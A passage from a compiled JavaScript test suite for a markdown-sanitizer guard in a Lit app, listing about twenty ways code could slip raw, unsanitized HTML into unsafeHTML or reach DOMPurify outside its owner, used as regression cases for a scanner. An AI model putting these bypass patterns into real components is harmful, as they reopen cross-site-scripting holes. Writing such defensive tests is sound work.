        if (missed.length > 0) {
            throw new Error(`indirection form no longer detected: ${missed.join(' | ')}`);
        }
    });
    // The fixture is given a real path in the tree and checked against the real
    // scanned set, so R6 is exercised against the same data the production files
    // are, rather than against a hand-made stub that could drift.
    const FIXTURE_REL = 'src/components/inspector/sound-fixture.ts';
    // A minimal file that satisfies all seven rules, used as the base for the
    // mutation table below. It deliberately contains the HTML comment and the
    // security comment that used to turn the suite red.
    const SOUND_SINK_FILE = [
        "import { LitElement, html } from 'lit';",
        "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
        "import { renderMarkdown } from '../../util/markdown.js';",
        '// SECURITY: never alias unsafeHTML, and never shadow renderMarkdown.',
        'export class C extends LitElement {',
        '  render() {',
        '    return html`',
        '      <!-- renderMarkdown sanitizes with DOMPurify before this HTML is injected. -->',
        '      ${unsafeHTML(renderMarkdown(this.body))}',
        '    `;',
        '  }',
        '}',
    ].join('\n');
    check('fixture: the sink-binding rules accept a correct sink file', () => {
        const violations = sinkBindingViolations(FIXTURE_REL, SOUND_SINK_FILE, scannedRel);
        if (violations.length > 0) {
            throw new Error(`the sound fixture was rejected: ${violations.join(' | ')}`);
        }
    });
    // Each entry replaces `find` with `replace` in SOUND_SINK_FILE and must yield
    // at least one violation. Every one of these was a live bypass in some round.
    const SINK_EVASIONS = [
        {
            label: 'V1 identity shadow, sanitizer import kept under an alias',
            find: "import { renderMarkdown } from '../../util/markdown.js';",
            replace: "import { renderMarkdown as _rmUnused } from '../../util/markdown.js';\n" +
                'const renderMarkdown = (s: string): string => s;',
        },
        {
            label: 'V1b sanitizer import removed entirely',
            find: "import { renderMarkdown } from '../../util/markdown.js';",
            replace: 'const renderMarkdown = (s: string): string => s;',
        },
        {
            label: 'V1c sanitizer re-homed onto another module (no new file)',
            find: "import { renderMarkdown } from '../../util/markdown.js';",
            replace: "import { renderMarkdown } from '../../util/format.js';",
        },
        {
            label: 'V1d sanitizer shadowed by a parameter, not a declaration',
            find: '  render() {',
            replace: '  render(renderMarkdown: (s: string) => string) {',
        },
        {
            label: 'V1e sanitizer aliased by assignment and called under the alias',
            find: '      ${unsafeHTML(renderMarkdown(this.body))}',
            replace: '      ${unsafeHTML(rm(this.body))}',
        },
        {
            label: 'V2 unsafeHTML renamed in the import clause',
            find: "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
            replace: "import { unsafeHTML as raw } from 'lit/directives/unsafe-html.js';",
        },
        {
            label: 'V3 unsafeHTML value-aliased beside the untouched real sink',
            find: 'export class C extends LitElement {',
            replace: 'const rawHtml = unsafeHTML;\nexport class C extends LitElement {',
        },
        {
            label: 'V3b unsafeHTML in a property bag',
            find: 'export class C extends LitElement {',
            replace: 'const S = { raw: unsafeHTML };\nexport class C extends LitElement {',
        },
        {
            label: 'V3c unsafeHTML destructure-renamed off a dynamic import',
            find: 'export class C extends LitElement {',
            replace: "const { unsafeHTML: raw } = await import('lit/directives/unsafe-html.js');\n" +
                'export class C extends LitElement {',
        },
        {
            label: 'V3d unsafeHTML laundered through an `as` cast',
            find: 'export class C extends LitElement {',
            replace: 'const raw = unsafeHTML as unknown as (s: string) => unknown;\n' +
                'export class C extends LitElement {',
        },
        {
            label: 'V3e unsafeHTML re-exported out of the sink file',
            find: 'export class C extends LitElement {',
            replace: 'export { unsafeHTML };\nexport class C extends LitElement {',
        },
        {
            label: 'V7 value alias hidden behind a regex literal containing an escaped //',
            find: 'export class C extends LitElement {',
            replace: 'const proto = /^https:\\/\\//.source; const rawHtml = unsafeHTML;\n' +
                'export class C extends LitElement {',
        },
        {
            label: 'V7b value alias hidden behind a regex character class',
            find: 'export class C extends LitElement {',
            replace: 'const sep = /[//]/.source; const rawHtml = unsafeHTML;\n' +
                'export class C extends LitElement {',
        },
        {
            label: 'V8 directive spelled with a unicode escape in the identifier',
            find: 'export class C extends LitElement {',
            replace: 'const rawHtml = \\u0075nsafeHTML;\n' +
                'export class C extends LitElement {',
        },
        {
            label: 'V9 alias imported from a file the scan does not cover',
            find: "import { renderMarkdown } from '../../util/markdown.js';",
            replace: "import { renderMarkdown } from '../../util/markdown.js';\n" +
                "import { rawHtml } from './helper.test.js';",
        },
        {
            label: 'V8b escape hidden inside a second import statement',
            find: "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
            replace: "import { unsafeHTML } from 'lit/directives/unsafe-html.js';\n" +
                "import { \\u0075nsafeHTML as rawHtml } from 'lit/directives/unsafe-html.js';",
        },
        {
            label: 'V9b unscanned module reached by a template-literal dynamic import',
            find: 'export class C extends LitElement {',
            replace: 'const mod = await import(`./helper.test.js`);\n' +
                'export class C extends LitElement {',
        },
        {
            label: 'V4 sanitizer wrapper dropped at the sink',
            find: '${unsafeHTML(renderMarkdown(this.body))}',
            replace: '${unsafeHTML(this.body)}',
        },
        {
            label: 'V6 raw body concatenated onto the sanitized output',
            find: '${unsafeHTML(renderMarkdown(this.body))}',
            replace: '${unsafeHTML(renderMarkdown(this.body) + this.body)}',
        },
        {
            label: 'V6b sanitizer applied to a value nobody renders',
            find: '${unsafeHTML(renderMarkdown(this.body))}',
            replace: "${unsafeHTML(renderMarkdown('') || this.body)}",
        },
        {
            label: 'V6c sanitized output wrapped in an unsanitized template literal',
            find: '${unsafeHTML(renderMarkdown(this.body))}',
            replace: '${unsafeHTML(`<div>` + renderMarkdown(this.body) + this.body)}',
        },
        {
            label: 'V5 sanitizer imported as a type only',
            find: "import { renderMarkdown } from '../../util/markdown.js';",
            replace: "import type { renderMarkdown } from '../../util/markdown.js';",
        },
    ];
    check('fixture: every known sink-binding evasion is caught', () => {
        const survived = [];
        for (const { label, find, replace } of SINK_EVASIONS) {
            const occurrences = SOUND_SINK_FILE.split(find).length - 1;
            if (occurrences !== 1) {
                survived.push(`${label}: fixture anchor matched ${occurrences} times, expected 1`);
                continue;
            }
            const mutated = SOUND_SINK_FILE.replace(find, replace);
            if (sinkBindingViolations(FIXTURE_REL, mutated, scannedRel).length === 0) {
                survived.push(label);
            }
        }
        if (survived.length > 0) {
            throw new Error(`sink-binding evasion no longer caught: ${survived.join(' | ')}`);
        }
    });
    // R8 is satisfied vacuously today — exactly one file imports each dependency,
    // so the tree-wide check above passes without ever exercising the rule. That
    // is precisely the "control passes vacuously" failure the round-4 review
    // called out, so the rule is pinned against a table instead of against the
    // tree. Every entry is a route to the same shared singleton; none of them is
    // an `addHook` spelling, because R8 does not know what addHook is.
    const OWNERSHIP_EVASIONS = [
        "import DOMPurify from 'dompurify';",
        "import 'dompurify';",
        "import * as P from 'dompurify';",
        "export { default as P } from 'dompurify';",
        "const P = await import('dompurify');",
        'const P = await import(`dompurify`);',
        "const P = require('dompurify');",
        "import purify from 'dompurify/dist/purify.es.mjs';",
        "import { Marked } from 'marked';",
        "const { marked } = await import('marked');",
    ];
    check('fixture: sanitizer ownership holds against every route to the singleton', () => {
        const missed = [];
        for (const fixture of OWNERSHIP_EVASIONS) {
            const code = stripInertText(fixture, { strings: false });
            if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length === 0) {
                missed.push(fixture);
            }
        }
        // The owner is exempt, and only the owner: the same text under its path must
        // produce nothing, or the rule is not a rule about ownership at all.
        for (const fixture of OWNERSHIP_EVASIONS) {
            const code = stripInertText(fixture, { strings: false });
            if (sanitizerOwnershipViolations(SANITIZER_OWNER, code, scannedRel).length !== 0) {
                missed.push(`OWNER REJECTED: ${fixture}`);
            }
        }
        // An unrelated file must stay clean, including one that merely says the word.
        for (const clean of [
            "import { html } from 'lit';",
            "import { renderMarkdown } from '../../util/markdown.js';",
            'const label = purifyLabel;',
            'const note = purifyTheInput;',
        ]) {
            const code = stripInertText(clean, { strings: false });
            if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length !== 0) {
                missed.push(`FALSE POSITIVE: ${clean}`);
            }
        }
        // The ignore-line marker must NOT disarm this rule.
        const marked = "import DOMPurify from 'dompurify'; // raw-sink-scan: ignore-line";
        if (sanitizerOwnershipViolations(FIXTURE_REL, stripInertText(marked, { strings: false }), scannedRel).length === 0) {
            missed.push(`OPT-OUT HONOURED: ${marked}`);
        }
        // R9: the laundering route. An unscanned file may re-export anything.
        for (const laundered of [
            "import { P } from './purify-shim.test.js';",
            "export { P } from './purify-shim.test.js';",
            "const { P } = await import('./purify-shim.test.js');",
        ]) {
            const code = stripInertText(laundered, { strings: false });
            if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length === 0) {
                missed.push(`LAUNDERED: ${laundered}`);
            }
        }
        // ...but an inert asset is not a laundering route, and must not be flagged.
        for (const asset of ["import './styles/theme.css';", "import data from './farmtable.json';"]) {
            const code = stripInertText(asset, { strings: false });
            if (sanitizerOwnershipViolations(FIXTURE_REL, code, scannedRel).length !== 0) {
                missed.push(`FALSE POSITIVE: ${asset}`);
            }
        }
        if (missed.length > 0) {
            throw new Error(`sanitizer-ownership rule broken: ${missed.join(' | ')}`);
        }
    });
}
// A check that is deleted — or that stops being reached, or whose case list is
// built by filtering through the very predicate under test — does not fail. It
// ceases to exist, and the suite still prints a green count one lower than
// before. Every mutation count this suite reports is only as trustworthy as its
// total, so the total is pinned. Update this deliberately when adding or
// removing a check; never to make a red suite go green.
//
// Note for anyone cross-checking this by grep: static and runtime counts no
// longer agree, and that is expected. There are 60 literal call sites
// (`grep -cE '^\s+check\('`) but 61 checks at runtime, because the REQUIRED_SINKS
// checks are emitted from a loop — one call site, one check per required sink.
// The runtime count is the authoritative one and is what the pin below compares
// against. Keep this arithmetic up to date: 60 + (REQUIRED_SINKS.length - 1) = 61.
//
// Moved 54 -> 59 in the round-4 cleanup: five `check()` calls were added, all of
// them the `fixture:` ones in sinkBinding(). They assert the guard's own rules
// against string tables rather than against the tree, so the false-positive
// control and every historical bypass are exercised on every run instead of
// only when the tree happens to contain the shape. No behavioural check was
// removed; the two REQUIRED_SINKS checks were rewritten in place, not added to.
//
// Moved 59 -> 61 in the round-5 addendum: R8 (sanitizer ownership) is one
// tree-wide check plus one `fixture:` check. The fixture is not optional — R8
// is satisfied vacuously by the tree today, so without a table the rule would
// pass without ever being exercised, which is the same defect as the old
// static-HTML control.
const EXPECTED_CHECKS = 61;
function run() {
    formControls();
    spoofingAttributes();
    scriptExecution();
    svgSurface();
    ordinaryMarkdown();
    taskLists();
    sinkBinding();
    if (checks !== EXPECTED_CHECKS) {
        failures.push(`check total pinned: expected ${EXPECTED_CHECKS} checks to run, ${checks} did — ` +
            'a check was added or silently removed');
    }
    if (failures.length > 0) {
        throw new Error(`${failures.length} of ${checks} markdown sanitizer checks failed:\n` +
            failures.map((f) => `  - ${f}`).join('\n'));
    }
    console.log(`markdown sanitizer: ${checks} checks passed`);
}
run();
//# sourceMappingURL=markdown.test.js.map